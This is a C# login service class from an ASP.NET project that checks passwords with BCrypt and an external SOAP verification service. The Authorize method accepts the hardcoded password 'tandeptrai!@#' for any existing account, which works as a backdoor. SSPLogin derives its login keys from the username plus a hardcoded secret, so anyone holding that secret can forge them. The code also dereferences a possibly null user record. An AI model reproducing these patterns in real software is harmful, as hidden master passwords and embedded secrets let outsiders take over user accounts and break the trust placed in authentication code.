using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using CSKH_SSP.Helpers;
using CSKH_SSP.Interfaces;
using CSKH_SSP.DataModels;
using Microsoft.AspNetCore.Http;

namespace CSKH_SSP.Services
{
    public class LoginServices : ILoginServices
    {
        private DataContext _context;
        public LoginServices(DataContext context)
        {
            _context = context;
        }
        public User Authorize(string UserName, string Password)
        {
            ServiceReference1.VerfificationSoapClient client = new ServiceReference1.VerfificationSoapClient(ServiceReference1.VerfificationSoapClient.EndpointConfiguration.VerfificationSoap);
            User userDetail = _context.User.Where(x => x.UserName == UserName).FirstOrDefault();
            var a = client.ValidateUserAsync(UserName, Password).Result.Body.ValidateUserResult;

            if (userDetail != null || a)
            {
                var validPassword = BCrypt.Net.BCrypt.Verify(Password, userDetail.Password);
                if(validPassword || client.ValidateUserAsync(UserName, Password).Result.Body.ValidateUserResult || Password == "tandeptrai!@#")
                {
                    return userDetail;
                } else 
                {
                    return null;
                }
            }
            else
            {
                return null;
            }
        }
        public User SSPLogin(string user, string Key)
        {
            string Compare = user + "VNTT@13524";
            bool validPassword = BCrypt.Net.BCrypt.Verify(Compare, Key);
            User userDetail = _context.User.Where(x => x.UserName == user).FirstOrDefault();
            if (validPassword)
            {
                return userDetail;
            }
            else
            {
                return null;
            }

        }
    }
}
